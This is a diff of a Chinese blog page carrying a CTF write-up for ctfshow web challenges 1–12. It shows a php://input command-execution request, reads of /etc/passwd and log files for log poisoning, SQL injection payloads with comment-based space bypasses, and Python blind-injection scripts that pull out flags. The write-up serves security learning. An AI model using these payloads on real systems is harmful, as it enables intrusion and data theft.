@@ -3,18 +3,18 @@
 <meta property="og:url" content="https://yu030x.github.io/2025/11/19/ctfshow-web%E9%A2%98/index.html">
 <meta property="og:site_name" content="YU030X的小站">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://yu030x.github.io/img/%E5%BE%8B%E5%B8%886.jpg">
+<meta property="og:image" content="https://yu030x.github.io/img/%E5%BE%8B%E5%B8%884.jpg">
 <meta property="article:published_time" content="2025-11-18T16:00:16.000Z">
 <meta property="article:modified_time" content="2026-01-16T02:50:03.425Z">
 <meta property="article:author" content="YU030X">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://yu030x.github.io/img/%E5%BE%8B%E5%B8%886.jpg"><script type="application/ld+json">{
+<meta name="twitter:image" content="https://yu030x.github.io/img/%E5%BE%8B%E5%B8%884.jpg"><script type="application/ld+json">{
   "@context": "https://schema.org",
   "@type": "BlogPosting",
   "headline": "ctfshow-web题",
   "url": "https://yu030x.github.io/2025/11/19/ctfshow-web%E9%A2%98/",
-  "image": "https://yu030x.github.io/img/%E5%BE%8B%E5%B8%886.jpg",
+  "image": "https://yu030x.github.io/img/%E5%BE%8B%E5%B8%884.jpg",
   "datePublished": "2025-11-18T16:00:16.000Z",
   "dateModified": "2026-01-16T02:50:03.425Z",
   "author": [
@@ -119,7 +119,7 @@
   algolia: undefined,
   localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
   translate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  highlight: undefined,
   copy: {
     success: '复制成功',
     error: '复制失败',
@@ -157,7 +157,7 @@
   isHighlightShrink: false,
   isToc: true,
   pageType: 'post'
-}</script><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/css/fonts.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/jetbrains-mono@5.2.8/400.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/noto-sans-sc@5.2.8/400.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/maple-mono@5.2.6/index.min.css"><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
+}</script><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/css/fonts.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/jetbrains-mono@5.2.8/400.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/noto-sans-sc@5.2.8/400.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/maple-mono@5.2.6/index.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
   restartOnPushState: false
 }
 
@@ -165,27 +165,52 @@ btf.addGlobalFn('pjaxSend', () => {
   Pace.restart()
 }, 'pace_restart')
 
-</script><link rel="stylesheet" href="/css/barber-shop.css"><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg" style="background-image: url(/img/%E8%83%8C%E6%99%AFthe%20castle2.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/yu030x.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/%E5%BE%8B%E5%B8%886.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">YU030X的小站</span></a><a class="nav-page-title" href="/"><span class="site-name">ctfshow-web题</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">ctfshow-web题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-18T16:00:16.000Z" title="发表于 2025-11-19 00:00:16">2025-11-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-16T02:50:03.425Z" title="更新于 2026-01-16 10:50:03">2026-01-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url(/img/%E5%BE%8B%E5%B8%886.jpg);"></div><article class="container post-content" id="article-container"><h1 id="CTFSHOW-WEB题"><a href="#CTFSHOW-WEB题" class="headerlink" title="CTFSHOW WEB题"></a>CTFSHOW WEB题</h1><h2 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h2><p>F12看源代码，发现<code> Y3Rmc2hvd3tiMDUyYTQ0ZS04MWEyLTRhNWYtYjkyYS1lNDhjNzQ0YWJlOWR9</code> ,通过base64解码得到flag</p>
-<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>简单的sql注入</p>
-<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>php伪协议</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /?url=php://input HTTP/1.1</span><br><span class="line">Host: 54122502-42c8-42df-b6e7-418bdc5b8afe.challenge.ctf.show</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: "Windows"</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://54122502-42c8-42df-b6e7-418bdc5b8afe.challenge.ctf.show/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 35</span><br><span class="line"></span><br><span class="line">&lt;?php system("cat ctf_go_go_go");?&gt;</span><br></pre></td></tr></tbody></table></figure>
+</script><link rel="stylesheet" href="/css/barber-shop.css"><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg" style="background-image: url(/img/%E8%83%8C%E6%99%AFthe%20castle2.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/yu030x.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/%E5%BE%8B%E5%B8%884.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">YU030X的小站</span></a><a class="nav-page-title" href="/"><span class="site-name">ctfshow-web题</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">ctfshow-web题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-18T16:00:16.000Z" title="发表于 2025-11-19 00:00:16">2025-11-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-16T02:50:03.425Z" title="更新于 2026-01-16 10:50:03">2026-01-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url(/img/%E5%BE%8B%E5%B8%884.jpg);"></div><article class="container post-content" id="article-container"><h1>CTFSHOW WEB题</h1>
+<h2 id="web签到题">web签到题</h2>
+<p>F12看源代码，发现<code> Y3Rmc2hvd3tiMDUyYTQ0ZS04MWEyLTRhNWYtYjkyYS1lNDhjNzQ0YWJlOWR9</code> ,通过base64解码得到flag</p>
+<h2 id="web2">web2</h2>
+<p>简单的sql注入</p>
+<h2 id="web3">web3</h2>
+<p>php伪协议</p>
+<pre><code>POST /?url=php://input HTTP/1.1
+Host: 54122502-42c8-42df-b6e7-418bdc5b8afe.challenge.ctf.show
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Dest: document
+Referer: https://54122502-42c8-42df-b6e7-418bdc5b8afe.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Priority: u=0, i
+Connection: keep-alive
+Content-Length: 35
 
-<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Myon5/article/details/133675614">参考</a></p>
+&lt;?php system("cat ctf_go_go_go");?&gt;
+</code></pre>
+<h2 id="web4">web4</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Myon5/article/details/133675614">参考</a></p>
 <p>先<code>/?url=/etc/passwd</code></p>
 <p>尝试php伪协议，回显error</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117221048667.png" alt="image-20251117221048667"></p>
 <p>提示信息：日志注入 文件包含</p>
 <p>尝试读取日志：<code>?url=/var/log/nginx/access.log</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223214263.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223214263.png" alt=""></p>
 <p>修改UA</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223443953.png" alt="image-20251117223443953"></p>
 <p>登录蚁剑</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223510010.png" alt="image-20251117223510010"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223536153.png" alt="image-20251117223536153"></p>
-<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>php md5弱类型比较</p>
+<h2 id="web5">web5</h2>
+<p>php md5弱类型比较</p>
 <p>ctype_alpha要求v1是纯字母</p>
 <p>is_numeric要求v2是数字</p>
-<p> 一些md5值以0e开头的字符串：</p>
+<p>一些md5值以0e开头的字符串：</p>
 <ul>
 <li>QNKCDZO</li>
 <li>240610708</li>
@@ -194,89 +219,238 @@ btf.addGlobalFn('pjaxSend', () => {
 <li>s21587387a</li>
 </ul>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118101053704.png" alt="image-20251118101053704"></p>
-<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>先用<code>' or 1=1 #</code>测试，返回sql inject error</p>
+<h2 id="web6">web6</h2>
+<p>先用<code>' or 1=1 #</code>测试，返回sql inject error</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104035834.png" alt="image-20251118104035834"></p>
 <p>输入<code>' </code>发现空格被过滤</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104221741.png" alt="image-20251118104221741"></p>
 <p>用/**/代替空格绕过</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104957833.png" alt="image-20251118104957833"></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">'or/**/1=1/**/order/**/by/**/3#</span><br><span class="line"></span><br><span class="line">'or/**/1=1/**/union/**/select/**/1,2,3#</span><br><span class="line"></span><br><span class="line">'or/**/1=1/**/union/**/select/**/1,database(),3#</span><br><span class="line"></span><br><span class="line">'or/**/1=1/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema='web2'#</span><br><span class="line"></span><br><span class="line">'or/**/1=1/**/union/**/select/**/1,group_concat(flag),3/**/from/**/web2.flag#</span><br></pre></td></tr></tbody></table></figure>
+<pre><code>'or/**/1=1/**/order/**/by/**/3#
 
-<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?id=1/**/order/**/by/**/3#</span><br><span class="line"></span><br><span class="line">?id=1/**/union/**/select/**/1,2,3#</span><br><span class="line"></span><br><span class="line">?id=1/**/union/**/select/**/1,database(),3#</span><br><span class="line"></span><br><span class="line">?id=1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='web7'),3#</span><br><span class="line">//这里注入发现报错无回显</span><br><span class="line"></span><br><span class="line">?id=1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema="web7"),3#</span><br><span class="line">//换成双引号，查到表名</span><br><span class="line"></span><br><span class="line">?id=1/**/union/**/select/**/1,group_concat(flag),3/**/from/**/web7.flag#</span><br></pre></td></tr></tbody></table></figure>
+'or/**/1=1/**/union/**/select/**/1,2,3#
 
-<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p><a target="_blank" rel="noopener" href="https://ctf.show/writeups/1549929">参考</a></p>
+'or/**/1=1/**/union/**/select/**/1,database(),3#
+
+'or/**/1=1/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema='web2'#
+
+'or/**/1=1/**/union/**/select/**/1,group_concat(flag),3/**/from/**/web2.flag#
+</code></pre>
+<h2 id="web7">web7</h2>
+<pre><code>?id=1/**/order/**/by/**/3#
+
+?id=1/**/union/**/select/**/1,2,3#
+
+?id=1/**/union/**/select/**/1,database(),3#
+
+?id=1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='web7'),3#
+//这里注入发现报错无回显
+
+?id=1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema="web7"),3#
+//换成双引号，查到表名
+
+?id=1/**/union/**/select/**/1,group_concat(flag),3/**/from/**/web7.flag#
+</code></pre>
+<h2 id="web8">web8</h2>
+<p><a target="_blank" rel="noopener" href="https://ctf.show/writeups/1549929">参考</a></p>
 <p>过滤字符</p>
 <ul>
 <li><code>and</code></li>
 <li><code>union</code>   // select查询的结果集无法在页面回显</li>
 <li><code>or</code></li>
 <li>空格  // 可用/**/替代</li>
-<li>……</li>
+<li>…</li>
 </ul>
 <p>脚本：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = "http://xxxxxxxxxx.challenge.ctf.show/index.php?id=-1"</span><br><span class="line">flag = ""</span><br><span class="line"></span><br><span class="line">for num in range(1,60):</span><br><span class="line">    l = 33</span><br><span class="line">    r = 130</span><br><span class="line">    mid = (l+r)&gt;&gt;1</span><br><span class="line">    while l&lt;r:</span><br><span class="line">        # 数据库：web8</span><br><span class="line">        # sql = "ascii(substr((select/**/database())/**/from/**/{}/**/for/**/1))&gt;{}".format(num,mid)</span><br><span class="line">        # 表：flag,page,user</span><br><span class="line">        # sql = "ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/{}/**/for/**/1))&gt;{}".format(num,mid)</span><br><span class="line">        # 列：flag</span><br><span class="line">        # sql = "ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666c6167)/**/from/**/{}/**/for/**/1))&gt;{}".format(num,mid)</span><br><span class="line">        # ctfshow{b54332e2-57d2-47c4-933a-d455e9b7e950}</span><br><span class="line">        sql = "ascii(substr((select/**/flag/**/from/**/flag)/**/from/**/{}/**/for/**/1))&gt;{}".format(num,mid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        payload = url + "/**/||/**/" + sql</span><br><span class="line"></span><br><span class="line">        # print(payload)</span><br><span class="line"></span><br><span class="line">        res = requests.get(payload)</span><br><span class="line">        </span><br><span class="line">        if 'If' in res.text:</span><br><span class="line">            l = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l+r)&gt;&gt;1</span><br><span class="line">    if chr(mid)==" ":</span><br><span class="line">        break</span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></tbody></table></figure>
+<pre><code>import requests
 
+url = "http://xxxxxxxxxx.challenge.ctf.show/index.php?id=-1"
+flag = ""
+
+for num in range(1,60):
+    l = 33
+    r = 130
+    mid = (l+r)&gt;&gt;1
+    while l&lt;r:
+        # 数据库：web8
+        # sql = "ascii(substr((select/**/database())/**/from/**/{}/**/for/**/1))&gt;{}".format(num,mid)
+        # 表：flag,page,user
+        # sql = "ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/{}/**/for/**/1))&gt;{}".format(num,mid)
+        # 列：flag
+        # sql = "ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666c6167)/**/from/**/{}/**/for/**/1))&gt;{}".format(num,mid)
+        # ctfshow{b54332e2-57d2-47c4-933a-d455e9b7e950}
+        sql = "ascii(substr((select/**/flag/**/from/**/flag)/**/from/**/{}/**/for/**/1))&gt;{}".format(num,mid)
+
+
+        payload = url + "/**/||/**/" + sql
+
+        # print(payload)
+
+        res = requests.get(payload)
+        
+        if 'If' in res.text:
+            l = mid + 1
+        else:
+            r = mid
+        mid = (l+r)&gt;&gt;1
+    if chr(mid)==" ":
+        break
+    flag += chr(mid)
+    print(flag)
+</code></pre>
 <p>二分法:</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = "http://xxxxxxxxxxxxxxx.challenge.ctf.show/index.php?id=-1"</span><br><span class="line">flag = ""</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(mid, num):</span><br><span class="line">    sql = "/**/||/**/ascii(substr((select/**/flag/**/from/**/flag)/**/from/**/{:d}/**/for/**/1))&lt;={:d}".format(num,mid)</span><br><span class="line">    payload = url + sql</span><br><span class="line">    res = requests.get(payload)</span><br><span class="line">    return 'If' in res.text</span><br><span class="line"></span><br><span class="line">def bsearch(l, r, num):</span><br><span class="line">    while l &lt; r:</span><br><span class="line">        mid = (l + r) &gt;&gt; 1</span><br><span class="line">        if check(mid, num): r = mid    # check()判断mid是否满足性质</span><br><span class="line">        else: l = mid + 1</span><br><span class="line">    return l</span><br><span class="line"></span><br><span class="line">for num in range(1, 60):</span><br><span class="line">    l = 33</span><br><span class="line">    r = 130</span><br><span class="line">    res = bsearch(l, r, num)</span><br><span class="line">    if chr(res) == "!":</span><br><span class="line">        break</span><br><span class="line">    flag += chr(res)</span><br><span class="line">    print(f'第{num}次遍历结果:{flag}')</span><br></pre></td></tr></tbody></table></figure>
+<pre><code>import requests
 
+url = "http://xxxxxxxxxxxxxxx.challenge.ctf.show/index.php?id=-1"
+flag = ""
+
+
+def check(mid, num):
+    sql = "/**/||/**/ascii(substr((select/**/flag/**/from/**/flag)/**/from/**/{:d}/**/for/**/1))&lt;={:d}".format(num,mid)
+    payload = url + sql
+    res = requests.get(payload)
+    return 'If' in res.text
+
+def bsearch(l, r, num):
+    while l &lt; r:
+        mid = (l + r) &gt;&gt; 1
+        if check(mid, num): r = mid    # check()判断mid是否满足性质
+        else: l = mid + 1
+    return l
+
+for num in range(1, 60):
+    l = 33
+    r = 130
+    res = bsearch(l, r, num)
+    if chr(res) == "!":
+        break
+    flag += chr(res)
+    print(f'第{num}次遍历结果:{flag}')
+</code></pre>
 <p><code>substr()</code>：截取单个字符</p>
 <p><code>ascii()</code>：转换为 ASCII 码</p>
-<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>dirsearch扫描</p>
+<h2 id="web9">web9</h2>
+<p>dirsearch扫描</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118132236761.png" alt="image-20251118132236761"></p>
 <p>打开robots.txt发现index.phps文件</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118132439610.png" alt="image-20251118132439610"></p>
 <p>payload：<code>ffifdyop</code></p>
-<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>点取消得到源码</p>
+<h2 id="web10">web10</h2>
+<p>点取消得到源码</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118133800784.png" alt="image-20251118133800784"></p>
 <p>由源码可知，<code>select、from、where、join、sleep、and、空格、union、,</code>被过滤了</p>
 <p>payload：<code>'or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#</code></p>
-<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>password为空，把cookie删掉</p>
+<h2 id="web11">web11</h2>
+<p>password为空，把cookie删掉</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118213819661.png" alt="image-20251118213819661"></p>
-<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>查看源码发现提示</p>
+<h2 id="web12">web12</h2>
+<p>查看源码发现提示</p>
